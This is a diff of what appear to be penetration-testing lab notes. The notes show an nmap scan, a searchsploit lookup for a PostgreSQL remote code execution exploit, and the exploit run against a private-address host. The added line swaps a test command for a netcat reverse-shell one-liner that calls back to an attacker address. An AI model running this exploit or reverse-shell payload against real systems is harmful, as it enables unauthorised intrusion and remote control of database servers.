@@ -256,8 +256,8 @@ sudo nmap -sC -sV -Pn -p- 192.168.207.47 -oN 207.47_allport
 searchsploit postgres 
 PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)                                                         | multiple/remote/50847.py
 
-searchsploi
-python3 50847.py -i 192.168.207.47 -p 5437 -c id
+searchsploit -m 50847
+python3 50847.py -i 192.168.207.47 -p 5437 -c rm /tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+192.168.45.222+9999+>/tmp/f'
 
 
 
